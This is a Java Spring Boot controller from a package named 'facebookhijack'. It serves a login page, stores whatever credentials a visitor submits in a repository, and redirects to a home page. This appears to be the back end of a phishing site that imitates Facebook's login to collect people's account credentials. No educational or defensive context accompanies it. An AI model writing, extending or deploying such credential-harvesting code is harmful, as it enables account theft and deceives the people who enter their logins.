package com.smart.facebookhijack;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RestController;

@Controller
public class FacebookController {
    @Autowired
    private FacebookRepo facebookRepo;

    @GetMapping("/")
    public String login(Model model) {
        FacebookUser facebookUser = new FacebookUser();
        model.addAttribute("user", facebookUser);
        return "login";
    }




    @PostMapping("/submit")
    public String submit(@ModelAttribute FacebookUser facebookUser) {
        facebookRepo.save(facebookUser);
        return "redirect:/home";
    }

    @GetMapping("/home")
    public String home() {
        return "home";
    }
}
